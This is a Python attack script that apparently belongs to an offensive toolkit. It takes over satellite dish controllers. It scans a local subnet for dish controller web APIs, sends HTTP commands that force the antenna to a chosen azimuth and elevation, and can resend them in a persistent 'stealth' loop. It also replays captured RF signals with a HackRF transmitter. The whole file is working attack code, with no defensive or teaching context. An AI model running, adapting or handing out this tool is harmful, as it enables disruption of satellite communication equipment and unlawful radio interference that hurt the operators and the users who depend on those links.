#!/usr/bin/env python3
# Path: modules/attacks/satellite_dish_aim_override.py

import argparse
import subprocess
import time
import os
import requests
import threading
import random
import logging
from datetime import datetime

LOG_PATH = "logs/attacks/dish_override.log"
os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
logging.basicConfig(filename=LOG_PATH, level=logging.INFO, format='[%(asctime)s] %(message)s')

KILL_FILE = "config/kill_switch.dish"
DEFAULT_FREQ = 1458000000  # 1.458 GHz typical uplink freq

def utc():
    return datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")

def log_event(msg):
    print(msg)
    logging.info(msg)

def send_ip_override(target_ip, azimuth, elevation, auth=None, stealth=False):
    endpoint = f"http://{target_ip}/api/control/point"
    payload = {"az": azimuth, "el": elevation}
    headers = {"Content-Type": "application/json"}
    try:
        r = requests.post(endpoint, json=payload, headers=headers, auth=auth, timeout=4)
        if r.status_code == 200:
            msg = f"[+] [IP] Dish override sent to {target_ip} [Az: {azimuth}, El: {elevation}]"
            log_event(msg)
            if not stealth:
                print(f"    └─ Response: OK")
        else:
            log_event(f"[!] Controller {target_ip} responded {r.status_code}: {r.text}")
    except Exception as e:
        log_event(f"[!] Failed to reach controller at {target_ip}: {e}")

def replay_rf_signal(signal_file, frequency):
    if not os.path.exists(signal_file):
        log_event(f"[!] RF signal file not found: {signal_file}")
        return
    log_event(f"[+] [RF] Replaying RF signal '{signal_file}' at {frequency/1e6:.2f} MHz")
    command = [
        "hackrf_transfer",
        "-t", signal_file,
        "-f", str(frequency),
        "-x", "40",
        "-s", "2000000",
        "-a", "1"
    ]
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        log_event(f"[!] RF replay failed: {e}")

def run_persistent_override(target_ip, azimuth, elevation, auth=None, interval=10):
    log_event(f"[~] Entering persistent override loop for {target_ip}")
    while True:
        if os.path.exists(KILL_FILE):
            log_event("[×] Kill switch detected, aborting loop")
            break
        send_ip_override(target_ip, azimuth, elevation, auth, stealth=True)
        time.sleep(interval)

def discover_controllers(ip_range="192.168.1.", port=80):
    discovered = []
    log_event("[*] Scanning IP range for dish controllers...")
    for i in range(1, 255):
        ip = f"{ip_range}{i}"
        try:
            r = requests.get(f"http://{ip}:{port}/api/status", timeout=1)
            if r.status_code == 200 and "dish" in r.text.lower():
                discovered.append(ip)
                log_event(f"[✓] Possible controller found: {ip}")
        except:
            pass
    return discovered

def main():
    parser = argparse.ArgumentParser(description="Override satellite dish aim via IP or RF replay")
    parser.add_argument("--mode", choices=["ip", "rf"], required=True, help="Override mode (ip or rf)")
    
    # IP mode args
    parser.add_argument("--target-ip", help="Target controller IP (for IP mode)")
    parser.add_argument("--azimuth", type=int, help="Azimuth angle")
    parser.add_argument("--elevation", type=int, help="Elevation angle")
    parser.add_argument("--auth-user", help="Username for HTTP Basic Auth")
    parser.add_argument("--auth-pass", help="Password for HTTP Basic Auth")
    parser.add_argument("--interval", type=int, default=15, help="Override resend interval")
    parser.add_argument("--persistent", action="store_true", help="Keep resending aim command")
    parser.add_argument("--discover", action="store_true", help="Scan for dish controllers in subnet")

    # RF mode args
    parser.add_argument("--signal-file", help="IQ/RF signal file to replay")
    parser.add_argument("--frequency", type=int, default=DEFAULT_FREQ, help="Replay frequency (Hz)")

    args = parser.parse_args()

    if args.mode == "ip":
        targets = []
        if args.discover:
            targets = discover_controllers()
        elif args.target_ip:
            targets = [args.target_ip]

        if not targets:
            print("[!] No targets specified or discovered.")
            return

        auth = (args.auth_user, args.auth_pass) if args.auth_user and args.auth_pass else None

        for ip in targets:
            if args.persistent:
                t = threading.Thread(target=run_persistent_override, args=(ip, args.azimuth, args.elevation, auth, args.interval))
                t.daemon = True
                t.start()
            else:
                send_ip_override(ip, args.azimuth, args.elevation, auth)

        if args.persistent:
            try:
                while True:
                    time.sleep(10)
            except KeyboardInterrupt:
                print("\n[!] Interrupted. Exiting.")
    elif args.mode == "rf":
        if not (args.signal_file and args.frequency):
            print("[!] RF mode requires --signal-file and --frequency")
            return
        replay_rf_signal(args.signal_file, args.frequency)

if __name__ == "__main__":
    main()
